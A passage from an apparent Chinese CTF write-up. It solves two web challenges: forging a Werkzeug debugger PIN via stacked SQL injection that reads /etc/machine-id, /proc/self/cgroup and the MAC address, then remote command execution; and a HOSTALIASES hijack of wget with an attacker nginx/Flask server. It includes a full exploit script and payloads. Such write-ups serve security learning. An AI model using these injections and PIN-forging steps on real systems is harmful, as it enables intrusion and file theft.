operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre><p>可以明白rv就是最后生成的PIN码，生成PIN需要几个关键变量，</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>即<code>username</code>,<code>modname</code>,<code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>,<code>getattr(mod, &quot;__file__&quot;, None)</code>,<code>str(uuid.getnode())</code>和<code>get_machine_id()</code></p><h3 id="username"><a href="#username" class="headerlink" title="username"></a>username</h3><p>根据报错可知，启动用户为<code>ctf</code>，即<code>username</code>为<code>ctf</code></p><h3 id="modname"><a href="#modname" class="headerlink" title="modname"></a>modname</h3><p>modname也是根据报错得知为<code>flask.app</code>，默认也是</p><h3 id="getattr-app-“name“-type-app-name"><a href="#getattr-app-“name“-type-app-name" class="headerlink" title="getattr(app, “name“, type(app).name)"></a>getattr(app, “<strong>name</strong>“, type(app).<strong>name</strong>)</h3><p><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>默认为Flask</p><h3 id="getattr-mod-“file“-None"><a href="#getattr-mod-“file“-None" class="headerlink" title="getattr(mod, “file“, None)"></a>getattr(mod, “<strong>file</strong>“, None)</h3><p><code>getattr(mod, &quot;__file__&quot;, None)</code>在报错界面可知为<code>/usr/local/lib/python3.8/site-packages/flask/app.py</code></p><h3 id="str-uuid-getnode"><a href="#str-uuid-getnode" class="headerlink" title="str(uuid.getnode())"></a>str(uuid.getnode())</h3><p>靶机此值每次重置都会变化</p><p><code>str(uuid.getnode())</code>即为靶机网卡MAC地址的十进制，利用堆叠注入，读入文件<code>-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;%23</code>(此处用load_file好像不可以)</p><p>然后用联合查询<code>0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)%23</code>从主页上读取信息</p><p>读取了<code>/sys/class/net/eth0/address</code>，用python <code>str(int(MAC.decode().replace(&quot;:&quot;, &quot;&quot;), 16))</code>处理为十进制</p><h3 id="get-machine-id"><a href="#get-machine-id" class="headerlink" title="get_machine_id()"></a>get_machine_id()</h3><p>靶机此值每次重置都会变化</p><p>最后就剩<code>get_machine_id()</code>，网上文章众说纷纭，因为flask更新过这边的生成逻辑，这里不举例了，读了<code>__init__.py</code>直接对着题目分析代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>            <span class="token keyword">import</span> winreg            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>                    <span class="token number">0</span><span class="token punctuation">,</span>                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> guid            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _machine_id</code></pre><p>看前两段</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id</code></pre><p>如果有了<code>_machine_id</code>就直接返回，网上第一种说法就是直接用<code>machine_id</code>生成，但是找了下这个变量的地址，在这个函数倒数第二行，<code>_machine_id = _generate()</code>，也就是说只是为了防止重复生成所以在开头写的这一段逻辑，并不是说直接用<code>machine_id</code>生成</p><p>接着往下看</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    linux <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> value<span class="token punctuation">:</span>            linux <span class="token operator">+=</span> value            <span class="token keyword">break</span></code></pre><p>根据逻辑可知，<code>value = f.readline().strip()</code>，即这里读到了<code>/etc/machine-id</code>后就break了</p><p>继续</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Containers share the same machine id, add some cgroup</span><span class="token comment"># information. This is used outside containers too but should be</span><span class="token comment"># relatively stable across boots.</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">except</span> OSError<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> linux<span class="token punctuation">:</span>    <span class="token keyword">return</span> linux</code></pre><p>读了<code>/proc/self/cgroup</code>，然后加了<code>/</code>后的数据，根据读到的情况有三种，分别如下</p><p><code>0::/system.slice/containerd.service    </code></p><p><code>10:memory:/docker/6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 </code></p><p><code>5:rdma:/    </code></p><p>实际上我读的数据是根据ascii序列排序过的，实际上如下</p><img src="/article/starctf2022/image-20220421133739605.png" class="" title="image-20220421133739605" loading="lazy"><p>但即使出错也没关系，因为如果读不到<code>f.readline().strip().rpartition(b&quot;/&quot;)[2]</code>，它会pass掉，继续往下读，所以最后读到的就是<code>docker/</code>后的值，也就是<code>/etc/machine-id</code>+<code>/proc/self/cgroup</code>里<code>docker/</code>后的值</p><p>然后就利用生成脚本生成PIN码，这里注意题目还有个改动，这里利用的是sha1的update，不是md5，<code>h = hashlib.sha1()</code></p><h3 id="写了一键构造脚本如下"><a href="#写了一键构造脚本如下" class="headerlink" title="写了一键构造脚本如下"></a>写了一键构造脚本如下</h3><pre class="language-Python" data-language="Python"><code class="language-Python">&quot;&quot;&quot;-*- coding: utf-8 -*-@File: getPin.py@Author: Err0r&quot;&quot;&quot;import randomimport stringimport uuidimport requests&quot;&quot;&quot;&#x2F;etc&#x2F;machine-id1cc402dd0e11d5ae18db04a6de87223d&#x2F;proc&#x2F;self&#x2F;cgroup+---------------------------------------------------------------------------------------------+| 0::&#x2F;system.slice&#x2F;containerd.service                                                         || 10:memory:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 11:freezer:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15         || 12:cpuset:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 1:name&#x3D;systemd:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15     || 2:hugetlb:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 3:net_cls,net_prio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 || 4:perf_event:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15       || 5:rdma:&#x2F;                                                                                    || 6:pids:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15             || 7:cpu,cpuacct:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15      || 8:devices:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 9:blkio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15            |+---------------------------------------------------------------------------------------------+&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_ida67fd832-a114-48c4-9ff7-161438b262dc&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address02:42:c0:a8:d0:03fuxk&quot;&quot;&quot;import hashlibfrom itertools import chainurl &#x3D; &quot;http:&#x2F;&#x2F;123.60.72.85:5002&#x2F;view&quot;session &#x3D; requests.session()cookies &#x3D; &#123;    &quot;session&quot;: &quot;eyJjc3JmX3Rva2VuIjoiNTIzYzk1ODJkMDY3YzU0Yjk5YmZjMjgyNGVlODgyYWZkNmFkZDgwOCIsInVzZXJuYW1lIjoiYTwvYT48c2NyaXB0PmFsZXJ0KDEpOzwvc2NyaXB0PjxhPiJ9.YlpCjg.o3nmen81K8VdxHDT-4lrydruCMQ&quot;&#125;def getPin(uuid, machine_id, username&#x3D;&#39;root&#39;, modname&#x3D;&#39;flask.app&#39;, className&#x3D;&#39;Flask&#39;,           file&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;):    probably_public_bits &#x3D; [        username,  # username        modname,  # modname        className,  # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))        file  # getattr(mod, &#39;__file__&#39;, None),    ]    private_bits &#x3D; [        uuid,  # str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address        machine_id  # get_machine_id(), &#x2F;etc&#x2F;machine-id    ]    h &#x3D; hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit &#x3D; bit.encode(&#39;utf-8&#39;)        h.update(bit)    h.update(b&#39;cookiesalt&#39;)    cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]    num &#x3D; None    if num is None:        h.update(b&#39;pinsalt&#39;)        num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]    rv &#x3D; None    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size &#x3D;&#x3D; 0:                rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                              for x in range(0, len(num), group_size))                break        else:            rv &#x3D; num    print(rv)    return rvdef createTable(file):    tablename &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 8))    paramsGet &#x3D; &#123;        &quot;note_id&quot;: f&quot;-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;\x23&quot;&#125;    res &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    # print(tablename)    return tablenamedef readtable(tablename):    paramsGet &#x3D; &#123;&quot;note_id&quot;: f&quot;0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)\x23&quot;&#125;    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    response &#x3D; response.content.split(b&#39;&lt;h1 style&#x3D;&quot;text-align: center&quot;&gt;\n&#39;)[1].split(b&quot;\n&quot;)[0][8:]    # print(response)    return responsedef check(pin):    res &#x3D; session.get(url, cookies&#x3D;cookies).text    s &#x3D; res.split(&quot;SECRET &#x3D; \&quot;&quot;)[1].split(&quot;\&quot;;&quot;)[0]    paramsGet &#x3D; &#123;        &quot;__debugger__&quot;: &quot;yes&quot;,        &quot;cmd&quot;: &quot;pinauth&quot;,        &quot;s&quot;: s,        &quot;pin&quot;: pin    &#125;    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    print(response.text)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    getmac &#x3D; createTable(&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;)    getmac &#x3D; str(int(readtable(getmac).decode().replace(&quot;:&quot;, &quot;&quot;), 16))    print(getmac)    getCgroup &#x3D; createTable(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;)    getCgroup &#x3D; str(readtable(getCgroup).decode().split(&quot;&#x2F;&quot;)[2].split(&quot;,&quot;)[0])    print(getCgroup)    getMachineId &#x3D; createTable(&quot;&#x2F;etc&#x2F;machine-id&quot;)    getMachineId &#x3D; str(readtable(getMachineId).decode())    print(getMachineId)    getBootId &#x3D; createTable(&quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;)    getBootId &#x3D; str(readtable(getBootId).decode())    print(getBootId)    # etcPasswd &#x3D; createTable(&quot;&#x2F;etc&#x2F;passwd&quot;)    # etcPasswd &#x3D; str(readtable(etcPasswd).decode()).split(&quot;,&quot;)    # users &#x3D; []    # for i in etcPasswd:    #     users.append(i.split(&quot;:&quot;)[0])    # print(users)    users &#x3D; [&#39;ctf&#39;]    for i in users:        print(i)        # pin1 &#x3D; getPin(getmac, getMachineId, username&#x3D;i)        # check(pin1)        #        # pin2 &#x3D; getPin(getmac, getCgroup, username&#x3D;i)        # check(pin2)        # pin3 &#x3D; getPin(getmac, getBootId+getCgroup, username&#x3D;i)        # check(pin3)        pin4 &#x3D; getPin(getmac, getMachineId+getCgroup, username&#x3D;i)        check(pin4)</code></pre><img src="/article/starctf2022/(null)-20220421125559691.(null)" class="" title="img" loading="lazy"><p>拿到pin码解锁，然后执行命令</p><img src="/article/starctf2022/(null)-20220421125600275.(null)" class="" title="img" loading="lazy"><p>根目录执行&#x2F;readflag</p><img src="/article/starctf2022/(null)-20220421125559899.(null)" class="" title="img" loading="lazy"><hr><h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>下载附件审计源码可以发现一个文件上传，保存为 <code>/app/guess/forecast.txt</code>。同时在通过如下 check 的情况下可以设置环境变量。</p><pre class="language-Python" data-language="Python"><code class="language-Python">def safe_check(s):    if &#39;LD&#39; in s or &#39;HTTP&#39; in s or &#39;BASH&#39; in s or &#39;ENV&#39; in s or &#39;PROXY&#39; in s or &#39;PS&#39; in s:         return False    return True</code></pre><p>设定好环境变量后执行如下逻辑。</p><pre class="language-Python" data-language="Python"><code class="language-Python">try:    os.system(&#39;wget --content-disposition -N lotto&#39;)    if os.path.exists(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;):        lotto_result &#x3D; open(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;, &#39;rb&#39;).read()    else:        lotto_result &#x3D; &#39;result&#39;    if os.path.exists(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;):        forecast &#x3D; open(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;, &#39;rb&#39;).read()    else:        forecast &#x3D; &#39;forecast&#39;    if forecast &#x3D;&#x3D; lotto_result:        return flag    else:        message &#x3D; &#39;Sorry forecast failed, maybe lucky next time!&#39;        return render_template(&#39;lotto.html&#39;, message&#x3D;message)except Exception as e:    message &#x3D; &#39;Lotto Error!&#39;    return render_template(&#39;lotto.html&#39;, message&#x3D;message)</code></pre><p>wget 处采用了 hostname 的方式，此时只要劫持到 lotto 即可实现任意文件下载。因此设置环境变量如下。</p><pre class="language-Bash" data-language="Bash"><code class="language-Bash">HOSTALIASES&#x3D;&#x2F;app&#x2F;guess&#x2F;forecast.txt</code></pre><img src="/article/starctf2022/(null)-20220421125601129.(null)" class="" title="img" loading="lazy"><p>将文件内容设置如下。</p><pre class="language-CSS" data-language="CSS"><code class="language-CSS">lotto lottod.lemonprefect.cn</code></pre><img src="/article/starctf2022/(null)-20220421125600612.(null)" class="" title="img" loading="lazy"><p>此时 lotto 的解析即可被劫持到 <code>lottod.lemonprefect.cn</code>。将如下 nginx 反代配置好。</p><pre class="language-Nginx" data-language="Nginx"><code class="language-Nginx">server    &#123;        listen 80;        #listen [::]:80;        server_name lottod.lemonprefect.cn lotto;        index index.html index.htm index.php default.html default.htm default.php;        root  &#x2F;home&#x2F;wwwroot&#x2F;lottod.lemonprefect.cn;        location &#x2F;        &#123;                proxy_pass http:&#x2F;&#x2F;localhost:8068;        &#125;        location ~ &#x2F;.well-known &#123;            allow all;        &#125;        location ~ &#x2F;\.        &#123;            deny all;        &#125;        access_log  &#x2F;home&#x2F;wwwlogs&#x2F;lottod.lemonprefect.cn.log;    &#125;</code></pre><p>在对应端口运行如下程序。</p><pre class="language-Python" data-language="Python"><code class="language-Python">from flask import Flask, make_responseimport secretsapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():    r &#x3D; &quot;lotto lottod.lemonprefect.cn&quot;    response &#x3D; make_response(r)    response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;plain&#39;    response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;lotto_result.txt&#39;    return responseif __name__ 